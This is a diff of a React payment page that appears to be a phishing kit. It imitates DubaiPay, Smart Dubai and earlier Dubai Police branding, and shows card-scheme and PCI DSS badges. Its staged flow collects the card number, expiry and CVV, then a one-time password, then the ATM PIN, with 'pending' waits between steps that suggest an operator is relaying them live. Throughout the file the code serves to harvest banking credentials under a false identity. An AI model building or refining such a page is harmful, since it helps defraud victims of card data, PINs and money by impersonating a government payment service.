@@ -1,322 +1,329 @@
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect, type ReactNode, type FormEvent } from "react";
 import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
 
-// ======== أنواع البيانات ========
 type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
 
-// ======== مكون شعار شرطة دبي ========
-function DubaiPoliceLogo({ size = 40 }: { size?: number }) {
-  const { lang } = useLanguage();
+type CardSubmitPayload = {
+  cardName: string;
+  cardNumber: string;
+  cardExpiry: string;
+  cardCvv: string;
+};
+
+function PaymentFrame({ children }: { children: ReactNode }) {
   return (
-    <img
-      src="/dubai-police-logo.svg"
-      width={size}
-      height={size}
-      alt={lang === "ar" ? "شرطة دبي" : "Dubai Police"}
-      style={{ borderRadius: "50%", objectFit: "contain", background: "transparent" }}
-    />
+    <div className="min-h-screen bg-[#eef3f7] px-3 py-4 sm:py-6" dir="ltr">
+      <div className="mx-auto max-w-[430px] overflow-hidden rounded-[34px] border border-[#e7edf5] bg-white shadow-[0_28px_70px_rgba(15,23,42,0.14)]">
+        {children}
+      </div>
+    </div>
   );
 }
 
-// ======== مكون شريط التقدم ========
-function ProgressSteps({ stage }: { stage: Stage }) {
-  const { t, isRTL } = useLanguage();
-  const steps = [
-    { id: "card", label: t.payment.steps.card, icon: "💳" },
-    { id: "otp", label: t.payment.steps.otp, icon: "🔐" },
-    { id: "atm", label: t.payment.steps.pin, icon: "🏧" },
-    { id: "success", label: t.payment.steps.success, icon: "✅" },
+function PaymentGatewayHeader() {
+  return (
+    <div className="bg-white px-4 pb-4 pt-5 sm:px-5">
+      <div className="mx-auto mb-4 h-1.5 w-20 rounded-full bg-[#eef2f7]" />
+      <div className="flex items-center justify-between gap-3 border-b border-[#edf2f7] pb-4">
+        <img
+          src="/dubaipay-logo.png"
+          alt="DubaiPay"
+          className="h-12 w-auto max-w-[150px] object-contain sm:h-14"
+        />
+        <img
+          src="/smart-dubai-logo.png"
+          alt="Smart Dubai"
+          className="h-11 w-auto max-w-[128px] object-contain sm:h-12"
+        />
+      </div>
+    </div>
+  );
+}
+
+function SectionCard({ title, children }: { title: string; children: ReactNode }) {
+  return (
+    <section className="overflow-hidden rounded-[22px] border border-[#edf2f7] bg-white shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
+      <div className="border-t-2 border-[#bcd8ea] bg-[#f4f8fc] px-5 py-4 text-[15px] font-semibold text-[#7a8796]">
+        {title}
+      </div>
+      <div className="px-5 py-4">{children}</div>
+    </section>
+  );
+}
+
+function InfoTable({ rows }: { rows: Array<{ label: string; value: string }> }) {
+  return (
+    <div className="space-y-0">
+      {rows.map((row, index) => (
+        <div
+          key={`${row.label}-${index}`}
+          className="flex items-center justify-between gap-4 border-b border-[#eef3f7] py-3 last:border-b-0"
+        >
+          <span className="text-[15px] text-[#697586]">{row.label}</span>
+          <span className="text-right text-[15px] font-medium text-[#2a3342]">{row.value}</span>
+        </div>
+      ))}
+    </div>
+  );
+}
+
+function ErrorBanner({ message }: { message: string }) {
+  return (
+    <div className="mb-4 rounded-2xl border border-[#f1c5c8] bg-[#fff5f5] px-4 py-3 text-[13px] text-[#c74343]">
+      {message}
+    </div>
+  );
+}
+
+function CvvCardIcon() {
+  return (
+    <svg width="84" height="58" viewBox="0 0 84 58" fill="none" xmlns="http://www.w3.org/2000/svg" className="h-12 w-auto">
+      <rect x="6" y="8" width="46" height="34" rx="6" fill="#93A1AF" />
+      <rect x="6" y="14" width="46" height="7" fill="#56616D" />
+      <rect x="35" y="28" width="24" height="17" rx="5" fill="#E9F0F6" stroke="#AAB7C4" />
+      <rect x="41" y="33" width="12" height="4" rx="2" fill="#FFFFFF" />
+      <circle cx="46" cy="35" r="1.7" fill="#D33B49" />
+      <circle cx="51" cy="35" r="1.7" fill="#D33B49" />
+      <circle cx="56" cy="35" r="1.7" fill="#D33B49" />
+    </svg>
+  );
+}
+
+function DonateIcon() {
+  return (
+    <svg width="74" height="60" viewBox="0 0 74 60" fill="none" xmlns="http://www.w3.org/2000/svg" className="h-12 w-auto text-[#1d3568]">
+      <path d="M17 30.5H57V47.5H17V30.5Z" stroke="currentColor" strokeWidth="2.2" />
+      <path d="M22 30V23.5C22 20.5 24.5 18 27.5 18H46.5C49.5 18 52 20.5 52 23.5V30" stroke="currentColor" strokeWidth="2.2" />
+      <path d="M37 14C39.8 12.7 41 10.1 41 8.2C41 6.2 39.6 4.8 37.8 4.8C36.3 4.8 35.1 5.7 34.5 7.1C33.9 5.7 32.7 4.8 31.2 4.8C29.4 4.8 28 6.2 28 8.2C28 10.1 29.2 12.7 32 14L34.5 15.3L37 14Z" fill="#1a7dc9" />
+      <path d="M36.5 19.5V39.5" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" />
+      <path d="M29 27.5L36.5 20L44 27.5" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
+    </svg>
+  );
+}
+
+function SecurityLogos() {
+  const badges = [
+    { title: "mastercard", subtitle: "ID Check", tone: "from-[#ff5f00] to-[#eb001b]" },
+    { title: "Verified by", subtitle: "VISA", tone: "from-[#1a4fb5] to-[#0f7ae5]" },
+    { title: "PCI DSS", subtitle: "CERTIFIED", tone: "from-[#7f8ea3] to-[#d24747]" },
   ];
 
-  const getStepStatus = (stepId: string) => {
-    const order = ["card", "otp", "atm", "success"];
-    const currentBase = stage.replace("_pending", "");
-    const currentIdx = order.indexOf(currentBase);
-    const stepIdx = order.indexOf(stepId);
-    if (stepIdx < currentIdx) return "done";
-    if (stepIdx === currentIdx) return "active";
-    return "pending";
-  };
-
   return (
-    <div className="flex items-center justify-center gap-1 mb-6 px-2" dir={isRTL ? "rtl" : "ltr"}>
-      {steps.map((step, i) => {
-        const status = getStepStatus(step.id);
-        return (
-          <div key={step.id} className="flex items-center">
-            <div className="flex flex-col items-center">
-              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all
-                ${status === "done" ? "bg-green-500 text-white" :
-                  status === "active" ? "bg-[#006633] text-white ring-2 ring-[#006633] ring-offset-2" :
-                  "bg-gray-200 text-gray-400"}`}>
-                {status === "done" ? "✓" : step.icon}
-              </div>
-              <span className={`text-xs mt-1 hidden sm:block
-                ${status === "active" ? "text-[#006633] font-bold" :
-                  status === "done" ? "text-green-600" : "text-gray-400"}`}>
-                {step.label}
-              </span>
-            </div>
-            {i < steps.length - 1 && (
-              <div className={`w-8 sm:w-12 h-0.5 mx-1 mb-4
-                ${getStepStatus(steps[i + 1].id) !== "pending" || status === "done" ? "bg-green-400" : "bg-gray-200"}`} />
-            )}
-          </div>
-        );
-      })}
-    </div>
-  );
-}
-
-// ======== مكون صفحة الانتظار ========
-function WaitingPage({ message }: { message: string }) {
-  const { t, isRTL } = useLanguage();
-  return (
-    <div className="flex flex-col items-center justify-center py-12 px-4">
-      <div className="relative mb-6">
-        <div className="w-20 h-20 rounded-full border-4 border-gray-200 border-t-[#006633] animate-spin" />
-        <div className="absolute inset-0 flex items-center justify-center">
-          <DubaiPoliceLogo size={36} />
+    <div className="mt-5 grid grid-cols-3 gap-3">
+      {badges.map((badge) => (
+        <div
+          key={badge.title}
+          className="rounded-2xl border border-[#e7edf5] bg-[#fbfdff] px-2 py-3 text-center shadow-sm"
+        >
+          <div className={`mx-auto mb-2 h-1.5 w-10 rounded-full bg-gradient-to-r ${badge.tone}`} />
+          <div className="text-[11px] font-semibold leading-tight text-[#24324a]">{badge.title}</div>
+          <div className="text-[11px] leading-tight text-[#6c7a89]">{badge.subtitle}</div>
         </div>
-      </div>
-      <h3 className="text-lg font-bold text-gray-800 mb-2 text-center">{message}</h3>
-      <p className="text-sm text-gray-500 text-center mb-6">{t.payment.waiting.dontClose}</p>
-      <div className="flex gap-1">
-        {[0, 1, 2].map(i => (
-          <div key={i} className="w-2 h-2 rounded-full bg-[#006633] animate-bounce"
-            style={{ animationDelay: `${i * 0.2}s` }} />
-        ))}
-      </div>
-      {/* شارة الأمان */}
-      <div className="mt-8 flex items-center gap-2 bg-green-50 border border-green-200 rounded-lg px-4 py-2">
-        <span className="text-green-600 text-lg">🔒</span>
-        <div>
-        <p className="text-xs font-bold text-green-700">{t.payment.waiting.secure}</p>
-        <p className="text-xs text-green-600">{t.payment.waiting.secureDesc}</p>
-        </div>
-      </div>
+      ))}
     </div>
   );
 }
 
-// ======== مكون صفحة النجاح ========
-function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
-  const { t, lang, isRTL } = useLanguage();
+function PaymentActionBar({
+  totalAmount,
+  isLoading,
+  onCancel,
+}: {
+  totalAmount: string;
+  isLoading: boolean;
+  onCancel: () => void;
+}) {
   return (
-    <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
-      <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-4">
-        <span className="text-4xl">✅</span>
+    <div className="mt-5 overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc]">
+      <div className="px-5 pb-2 pt-5 text-center text-[16px] font-medium text-[#2b3647]">
+        Total Amount {totalAmount} AED
       </div>
-      <h2 className="text-2xl font-bold text-green-600 mb-2">{t.payment.success.title}</h2>
-      <p className="text-gray-600 mb-4">{t.payment.success.subtitle}</p>
-      <div className="bg-green-50 border border-green-200 rounded-xl p-4 mb-6 w-full max-w-xs">
-        <p className="text-sm text-gray-500">{t.payment.success.amountPaid}</p>
-        <p className="text-2xl font-bold text-green-600">{totalAmount} {t.payment.header.currency}</p>
+      <div className="flex items-center gap-3 px-5 pb-5 pt-3">
+        <button
+          type="button"
+          onClick={onCancel}
+          className="flex-1 rounded-full bg-white px-5 py-3 text-[17px] font-medium text-[#6a7380] shadow-sm transition hover:bg-[#f8fbff]"
+        >
+          Cancel
+        </button>
+        <button
+          type="submit"
+          disabled={isLoading}
+          className="flex-1 rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
+        >
+          {isLoading ? "Processing..." : "Pay"}
+        </button>
       </div>
-      <div className={`bg-gray-50 rounded-xl p-4 mb-6 w-full max-w-xs ${isRTL ? "text-right" : "text-left"}`}>
-        <p className="text-sm text-gray-500 mb-1">{t.payment.success.reference}</p>
-        <p className="text-sm font-mono text-gray-700">DP-{Date.now().toString().slice(-8)}</p>
-        <p className="text-xs text-gray-400 mt-2">{new Date().toLocaleString(lang === "ar" ? "ar-AE" : "en-AE")}</p>
-      </div>
-      <button onClick={onDone}
-        className="w-full max-w-xs bg-[#006633] text-white py-3 rounded-xl font-bold text-base hover:bg-[#005528] transition">
-        {t.payment.success.backButton}
-      </button>
     </div>
   );
 }
 
-// ======== مكون صفحة الفشل ========
-function FailedPage({ onRetry }: { onRetry: () => void }) {
-  const { t, isRTL } = useLanguage();
+function PaymentFooter() {
   return (
-    <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
-      <div className="w-20 h-20 rounded-full bg-red-100 flex items-center justify-center mb-4">
-        <span className="text-4xl">❌</span>
-      </div>
-      <h2 className="text-2xl font-bold text-red-600 mb-2">{t.payment.failed.title}</h2>
-      <p className="text-gray-600 mb-6">{t.payment.failed.subtitle}</p>
-      <button onClick={onRetry}
-        className="w-full max-w-xs bg-[#006633] text-white py-3 rounded-xl font-bold text-base hover:bg-[#005528] transition">
-        {t.payment.failed.retryButton}
-      </button>
+    <div className="px-6 pb-7 pt-5 text-center">
+      <p className="text-[15px] text-[#2f3746]">
+        For more inquiries please call <span className="font-semibold text-[#1271bf]">600 560 000</span>
+      </p>
+      <p className="mt-2 text-[12px] text-[#8a95a3]">Copyright © 2020. All rights reserved.</p>
     </div>
   );
 }
 
-// ======== صفحة بيانات البطاقة ========
 function CardForm({
   onSubmit,
+  onCancel,
   isLoading,
   error,
+  totalAmount,
 }: {
-  onSubmit: (data: { cardName: string; cardNumber: string; cardExpiry: string; cardCvv: string }) => void;
+  onSubmit: (data: CardSubmitPayload) => void;
+  onCancel: () => void;
   isLoading: boolean;
   error?: string | null;
+  totalAmount: string;
 }) {
-  const [cardName, setCardName] = useState("");
+  const [cardName] = useState("Dubai Pay");
   const [cardNumber, setCardNumber] = useState("");
-  const [cardExpiry, setCardExpiry] = useState("");
-  const [cardCvv, setCvv] = useState("");
+  const [expiryMonth, setExpiryMonth] = useState("");
+  const [expiryYear, setExpiryYear] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
   const [errors, setErrors] = useState<Record<string, string>>({});
-  const { t, isRTL } = useLanguage();
+  const { t } = useLanguage();
 
   const formatCardNumber = (value: string) => {
     const digits = value.replace(/\D/g, "").slice(0, 16);
     return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
   };
 
-  const formatExpiry = (value: string) => {
-    const digits = value.replace(/\D/g, "").slice(0, 4);
-    if (digits.length >= 2) return digits.slice(0, 2) + "/" + digits.slice(2);
-    return digits;
-  };
-
   const validate = () => {
     const newErrors: Record<string, string> = {};
-    if (!cardName.trim()) newErrors.cardName = t.payment.card.errors.cardHolder;
     if (cardNumber.replace(/\s/g, "").length < 16) newErrors.cardNumber = t.payment.card.errors.cardNumber;
-    if (cardExpiry.length < 5) newErrors.cardExpiry = t.payment.card.errors.expiry;
+    if (expiryMonth.length !== 2 || Number(expiryMonth) < 1 || Number(expiryMonth) > 12) newErrors.cardExpiry = t.payment.card.errors.expiry;
+    if (expiryYear.length !== 2) newErrors.cardExpiry = t.payment.card.errors.expiry;
     if (cardCvv.length < 3) newErrors.cardCvv = t.payment.card.errors.cvv;
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = (e: FormEvent) => {
     e.preventDefault();
     if (!validate()) return;
-    onSubmit({ cardName, cardNumber: cardNumber.replace(/\s/g, ""), cardExpiry, cardCvv });
+    onSubmit({
+      cardName,
+      cardNumber: cardNumber.replace(/\s/g, ""),
+      cardExpiry: `${expiryMonth}/${expiryYear}`,
+      cardCvv,
+    });
   };
-
-  // تحديد نوع البطاقة
-  const getCardType = () => {
-    const num = cardNumber.replace(/\s/g, "");
-    if (num.startsWith("4")) return "visa";
-    if (num.startsWith("5") || num.startsWith("2")) return "mastercard";
-    return null;
-  };
-
-  const cardType = getCardType();
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-4" dir={isRTL ? "rtl" : "ltr"}>
-      <div className="bg-gradient-to-br from-[#006633] to-[#004d26] rounded-2xl p-5 text-white mb-6 relative overflow-hidden">
-        <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -translate-y-1/2 translate-x-1/2" />
-        <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full translate-y-1/2 -translate-x-1/2" />
-        <div className="flex justify-between items-start mb-6">
-          <div className="flex gap-2">
-            {cardType === "visa" && <span className="bg-white text-blue-800 font-bold text-xs px-2 py-1 rounded">VISA</span>}
-            {cardType === "mastercard" && (
-              <div className="flex">
-                <div className="w-6 h-6 rounded-full bg-red-500 opacity-90" />
-                <div className="w-6 h-6 rounded-full bg-yellow-400 opacity-90 -mr-2" />
+    <form onSubmit={handleSubmit} className="space-y-4">
+      {error && <ErrorBanner message={error} />}
+
+      <SectionCard title="Card Details">
+        <div className="space-y-4">
+          <div className="grid grid-cols-[132px_minmax(0,1fr)] items-center gap-x-4 gap-y-2">
+            <label className="text-[15px] font-medium text-[#1e293b]">Card Number</label>
+            <div>
+              <input
+                type="text"
+                inputMode="numeric"
+                value={cardNumber}
+                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                placeholder="Enter Card Number"
+                maxLength={19}
+                className={`h-12 w-full rounded-[10px] border bg-white px-4 text-[15px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] ${errors.cardNumber ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
+              />
+              {errors.cardNumber && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardNumber}</p>}
+            </div>
+          </div>
+
+          <div className="grid grid-cols-[132px_minmax(0,1fr)] items-center gap-x-4 gap-y-2">
+            <label className="text-[15px] font-medium text-[#1e293b]">Expiry Date</label>
+            <div>
+              <div className="flex items-center gap-3">
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={expiryMonth}
+                  onChange={(e) => setExpiryMonth(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                  placeholder="MM"
+                  maxLength={2}
+                  className={`h-12 w-[62px] rounded-[10px] border bg-white px-3 text-center text-[15px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] ${errors.cardExpiry ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
+                />
+                <span className="text-[24px] text-[#95a1af]">/</span>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={expiryYear}
+                  onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                  placeholder="YY"
+                  maxLength={2}
+                  className={`h-12 w-[62px] rounded-[10px] border bg-white px-3 text-center text-[15px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] ${errors.cardExpiry ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
+                />
               </div>
-            )}
+              {errors.cardExpiry && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardExpiry}</p>}
+            </div>
           </div>
-          <div className="w-8 h-6 bg-yellow-400/80 rounded-sm" />
-        </div>
-        <p className="font-mono text-lg tracking-widest mb-4">
-          {cardNumber || "**** **** **** ****"}
-        </p>
-        <div className="flex justify-between items-end">
-          <div>
-            <p className="text-xs text-white/60">{t.payment.card.cardHolder}</p>
-            <p className="text-sm font-bold uppercase">{cardName || "CARD HOLDER"}</p>
+
+          <div className="grid grid-cols-[132px_minmax(0,1fr)] items-center gap-x-4 gap-y-2">
+            <label className="text-[15px] font-medium text-[#1e293b]">CVV Number</label>
+            <div>
+              <div className="flex items-center gap-3">
+                <input
+                  type="password"
+                  inputMode="numeric"
+                  value={cardCvv}
+                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                  placeholder="CVV"
+                  maxLength={4}
+                  className={`h-12 w-[80px] rounded-[10px] border bg-white px-3 text-center text-[15px] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db] ${errors.cardCvv ? "border-[#ef9a9a]" : "border-[#c9d3de]"}`}
+                />
+                <CvvCardIcon />
+              </div>
+              {errors.cardCvv && <p className="mt-1 text-[12px] text-[#d14b4b]">{errors.cardCvv}</p>}
+            </div>
           </div>
-          <div className={isRTL ? "text-right" : "text-left"}>
 
-            <p className="text-xs text-white/60">{t.payment.card.expiry}</p>
-            <p className="text-sm font-bold">{cardExpiry || "MM/YY"}</p>
+          <p className="pt-2 text-[13px] leading-6 text-[#6e7b89]">
+            CVV number (Security Code) is the last three digits of the number found on the back of your credit card near the signature strip.
+          </p>
+
+          <SecurityLogos />
+        </div>
+      </SectionCard>
+
+      <div className="rounded-[22px] border border-[#edf2f7] bg-white px-5 py-4 shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
+        <div className="flex items-center gap-4">
+          <input type="checkbox" className="h-5 w-5 rounded border-[#cbd5e1] text-[#0d67be] focus:ring-[#0d67be]" />
+          <div className="min-w-0 flex-1">
+            <p className="text-[14px] font-semibold leading-6 text-[#1d3568]">Donate for charity “Dirham Alkhair”</p>
+            <button type="button" className="mt-1 text-[14px] text-[#0d67be] underline underline-offset-2">
+              Learn More
+            </button>
           </div>
+          <DonateIcon />
         </div>
       </div>
 
-      {error && (
-        <div className="bg-red-50 border border-red-300 rounded-xl p-3 flex items-center gap-2">
-          <span className="text-red-500">⚠️</span>
-          <p className="text-sm text-red-600">{error}</p>
-        </div>
-      )}
-
-      <div>
-        <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.cardHolder}</label>
-        <input
-          type="text"
-          value={cardName}
-          onChange={e => setCardName(e.target.value)}
-          placeholder={t.payment.card.cardHolderPlaceholder}
-          className={`w-full border rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-[#006633] transition
-            ${errors.cardName ? "border-red-400 bg-red-50" : "border-gray-300"}`}
-        />
-        {errors.cardName && <p className="text-xs text-red-500 mt-1">{errors.cardName}</p>}
-      </div>
-
-      <div>
-        <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.cardNumber}</label>
-        <input
-          type="text"
-          inputMode="numeric"
-          value={cardNumber}
-          onChange={e => setCardNumber(formatCardNumber(e.target.value))}
-          placeholder="0000 0000 0000 0000"
-          maxLength={19}
-          className={`w-full border rounded-xl px-4 py-3 text-sm font-mono tracking-widest focus:outline-none focus:ring-2 focus:ring-[#006633] transition
-            ${errors.cardNumber ? "border-red-400 bg-red-50" : "border-gray-300"}`}
-        />
-        {errors.cardNumber && <p className="text-xs text-red-500 mt-1">{errors.cardNumber}</p>}
-      </div>
-
-      <div className="grid grid-cols-2 gap-3">
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.expiry}</label>
-          <input
-            type="text"
-            inputMode="numeric"
-            value={cardExpiry}
-            onChange={e => setCardExpiry(formatExpiry(e.target.value))}
-            placeholder="MM/YY"
-            maxLength={5}
-            className={`w-full border rounded-xl px-4 py-3 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-[#006633] transition
-              ${errors.cardExpiry ? "border-red-400 bg-red-50" : "border-gray-300"}`}
-          />
-          {errors.cardExpiry && <p className="text-xs text-red-500 mt-1">{errors.cardExpiry}</p>}
-        </div>
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
-          <input
-            type="password"
-            inputMode="numeric"
-            value={cardCvv}
-            onChange={e => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
-            placeholder="***"
-            maxLength={4}
-            className={`w-full border rounded-xl px-4 py-3 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-[#006633] transition
-              ${errors.cardCvv ? "border-red-400 bg-red-50" : "border-gray-300"}`}
-          />
-          {errors.cardCvv && <p className="text-xs text-red-500 mt-1">{errors.cardCvv}</p>}
-        </div>
-      </div>
-
-      <button type="submit" disabled={isLoading}
-        className="w-full bg-[#006633] text-white py-4 rounded-xl font-bold text-base hover:bg-[#005528] transition disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2">
-        {isLoading ? (
-          <>
-            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-            {t.payment.card.processing}
-          </>
-        ) : (
-          <>
-            🔒 {t.payment.card.payButton}
-          </>
-        )}
-      </button>
+      <PaymentActionBar totalAmount={totalAmount} isLoading={isLoading} onCancel={onCancel} />
     </form>
   );
 }
 
-// ======== صفحة OTP ========
+function WaitingPage({ message }: { message: string }) {
+  return (
+    <div className="rounded-[22px] border border-[#edf2f7] bg-white px-5 py-12 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
+      <div className="mx-auto mb-5 h-14 w-14 animate-spin rounded-full border-[3px] border-[#d8e6f3] border-t-[#0d67be]" />
+      <h3 className="text-[20px] font-semibold text-[#263445]">Processing Request</h3>
+      <p className="mt-3 text-[14px] leading-7 text-[#6f7b88]">{message}</p>
+      <p className="mt-2 text-[13px] text-[#90a0b2]">Please wait and do not close this page.</p>
+    </div>
+  );
+}
+
 function OtpForm({
   onSubmit,
   isLoading,
@@ -328,9 +335,9 @@ function OtpForm({
 }) {
   const [otp, setOtp] = useState("");
   const [otpError, setOtpError] = useState("");
-  const { t, isRTL } = useLanguage();
+  const { t } = useLanguage();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = (e: FormEvent) => {
     e.preventDefault();
     if (otp.length < 4) {
       setOtpError(t.payment.otp.error);
@@ -341,50 +348,38 @@ function OtpForm({
   };
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-6" dir={isRTL ? "rtl" : "ltr"}>
-      <div className="text-center">
-        <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
-          <span className="text-3xl">📱</span>
+    <form onSubmit={handleSubmit} className="space-y-4">
+      {(error || otpError) && <ErrorBanner message={error || otpError} />}
+      <SectionCard title="Card Security Verification">
+        <div className="text-center">
+          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#edf5fd] text-[28px]">📱</div>
+          <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.otp.title}</h3>
+          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.otp.subtitle}</p>
+          <input
+            type="text"
+            inputMode="numeric"
+            value={otp}
+            onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))}
+            placeholder={t.payment.otp.placeholder}
+            maxLength={8}
+            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[26px] tracking-[0.45em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
+          />
         </div>
-        <h3 className="text-lg font-bold text-gray-800">{t.payment.otp.title}</h3>
-        <p className="text-sm text-gray-500 mt-1">{t.payment.otp.subtitle}</p>
+      </SectionCard>
+
+      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
+        <button
+          type="submit"
+          disabled={isLoading}
+          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
+        >
+          {isLoading ? t.payment.otp.verifying : t.payment.otp.confirmButton}
+        </button>
       </div>
-
-      {(error || otpError) && (
-        <div className="bg-red-50 border border-red-300 rounded-xl p-3 flex items-center gap-2">
-          <span className="text-red-500">⚠️</span>
-          <p className="text-sm text-red-600">{error || otpError}</p>
-        </div>
-      )}
-
-      <div>
-        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">{t.payment.otp.label}</label>
-        <input
-          type="text"
-          inputMode="numeric"
-          value={otp}
-          onChange={e => setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))}
-          placeholder={t.payment.otp.placeholder}
-          maxLength={8}
-          className={`w-full border rounded-xl px-4 py-4 text-center text-2xl font-mono tracking-[0.5em] focus:outline-none focus:ring-2 focus:ring-[#006633] transition
-            ${(error || otpError) ? "border-red-400 bg-red-50" : "border-gray-300"}`}
-        />
-      </div>
-
-      <button type="submit" disabled={isLoading}
-        className="w-full bg-[#006633] text-white py-4 rounded-xl font-bold text-base hover:bg-[#005528] transition disabled:opacity-60 flex items-center justify-center gap-2">
-        {isLoading ? (
-          <>
-            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-            {t.payment.otp.verifying}
-          </>
-        ) : t.payment.otp.confirmButton}
-      </button>
     </form>
   );
 }
 
-// ======== صفحة ATM PIN ========
 function AtmPinForm({
   onSubmit,
   isLoading,
@@ -396,9 +391,9 @@ function AtmPinForm({
 }) {
   const [pin, setPin] = useState("");
   const [pinError, setPinError] = useState("");
-  const { t, isRTL } = useLanguage();
+  const { t } = useLanguage();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = (e: FormEvent) => {
     e.preventDefault();
     if (pin.length < 4) {
       setPinError(t.payment.atm.error);
@@ -409,58 +404,101 @@ function AtmPinForm({
   };
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-6" dir={isRTL ? "rtl" : "ltr"}>
-      <div className="text-center">
-        <div className="w-16 h-16 bg-amber-100 rounded-full flex items-center justify-center mx-auto mb-3">
-          <span className="text-3xl">🏧</span>
+    <form onSubmit={handleSubmit} className="space-y-4">
+      {(error || pinError) && <ErrorBanner message={error || pinError} />}
+      <SectionCard title="ATM PIN Verification">
+        <div className="text-center">
+          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#fff4e6] text-[28px]">🏧</div>
+          <h3 className="text-[20px] font-semibold text-[#263445]">{t.payment.atm.title}</h3>
+          <p className="mt-2 text-[14px] leading-7 text-[#6f7b88]">{t.payment.atm.subtitle}</p>
+          <input
+            type="password"
+            inputMode="numeric"
+            value={pin}
+            onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 6))}
+            placeholder="••••"
+            maxLength={6}
+            className="mt-5 h-14 w-full rounded-[14px] border border-[#c9d3de] bg-white px-4 text-center text-[26px] tracking-[0.45em] text-[#273447] outline-none transition placeholder:text-[#a3adba] focus:border-[#8ab9db]"
+          />
+          <div className="mt-4 rounded-2xl border border-[#ffe1b4] bg-[#fff8eb] px-4 py-3 text-right text-[13px] leading-6 text-[#9b6b11]">
+            {t.payment.atm.warning}
+          </div>
         </div>
-        <h3 className="text-lg font-bold text-gray-800">{t.payment.atm.title}</h3>
-        <p className="text-sm text-gray-500 mt-1">{t.payment.atm.subtitle}</p>
+      </SectionCard>
+
+      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
+        <button
+          type="submit"
+          disabled={isLoading}
+          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7] disabled:cursor-not-allowed disabled:opacity-60"
+        >
+          {isLoading ? t.payment.atm.verifying : t.payment.atm.confirmButton}
+        </button>
       </div>
-
-      {(error || pinError) && (
-        <div className="bg-red-50 border border-red-300 rounded-xl p-3 flex items-center gap-2">
-          <span className="text-red-500">⚠️</span>
-          <p className="text-sm text-red-600">{error || pinError}</p>
-        </div>
-      )}
-
-      <div>
-        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">{t.payment.atm.label}</label>
-        <input
-          type="password"
